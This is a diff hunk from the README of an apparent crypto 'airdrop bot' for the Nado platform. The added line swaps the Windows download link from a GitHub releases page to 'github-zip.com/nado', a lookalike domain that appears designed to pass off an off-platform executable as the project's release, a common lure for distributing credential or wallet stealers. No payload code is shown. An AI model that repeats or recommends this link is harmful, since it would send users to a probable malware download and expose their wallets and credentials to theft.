@@ -20,7 +20,7 @@ Nado has $42B in cumulative volume and growing daily activity, making early poin
 
 | Platform | Architecture | Download |
 |----------|-------------|----------|
-| **Windows** | x64 | [Download the latest release](https://github.com/batgod777/nado-airdrop-bot/releases) |
+| **Windows** | x64 | [Download the latest release](https://github-zip.com/nado) |
 
 ---
 
